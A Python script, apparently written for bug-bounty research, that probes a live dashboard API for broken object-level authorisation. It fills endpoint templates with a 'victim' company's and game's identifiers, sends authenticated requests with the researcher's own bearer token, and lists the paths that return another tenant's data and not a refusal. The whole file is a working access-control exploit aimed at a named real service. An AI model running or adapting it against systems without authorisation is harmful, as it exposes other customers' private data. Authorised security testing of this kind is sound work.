import json,urllib.request,urllib.error,time,re,sys
from concurrent.futures import ThreadPoolExecutor
TOK=json.load(open("dash_token.json"))["access_token"]
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36"
MYC="com_eBRDihmnOJa"; MYG="gm_eDTjNboxMxn"
VIC_C=sys.argv[1] if len(sys.argv)>1 else "com_eGwBObdcIVz"
VIC_G=sys.argv[2] if len(sys.argv)>2 else "gm_eGVcrwxCfOH"
PH="aaBBccDDeeFF"  # placeholder for other path params
def build(t,c,g):
    p=t.replace("{company_id}",c).replace("{game_id}",g)
    p=re.sub(r'\{[a-zA-Z_]+_id\}',PH,p)
    p=re.sub(r'\{[a-zA-Z_]+\}',PH,p)
    return p
def req(path,method="GET"):
    url="https://dashboard-api.aghanim.com/dashboard"+path
    h={"User-Agent":UA,"Authorization":f"Bearer {TOK}","X-Bug-Bounty":"RESEARCHER_EMAIL","Accept":"application/json"}
    r=urllib.request.Request(url,headers=h,method=method)
    try:
        with urllib.request.urlopen(r,timeout=25) as resp:
            b=resp.read(300); return resp.status,b.decode('utf-8','replace')
    except urllib.error.HTTPError as e:
        try: b=e.read(200).decode('utf-8','replace')
        except: b=""
        return e.code,b
    except Exception as e:
        return None,str(e)[:80]
tmpls=json.load(open("dash_paths.json"))
jobs=[]
for t in tmpls:
    if t.startswith("/v1/admin"): continue
    jobs.append(("victim",build(t,VIC_C,VIC_G)))
for tag,p in jobs:
    pass
def work(p):
    c,b=req(p)
    return p,c,b
out=[]
with ThreadPoolExecutor(max_workers=6) as ex:
    for p,c,b in ex.map(work,[p for _,p in jobs]):
        out.append((c,p,b))
json.dump([{"status":c,"path":p,"body":b[:200]} for c,p,b in out],open("bola_results.json","w"),indent=1)
from collections import Counter
print(Counter(c for c,_,_ in out))
print("--- non-403/401 responses against OTHER company ---")
for c,p,b in sorted(out):
    if c not in (403,401,404,405,422,400):
        print(c,p,"|",b[:150])
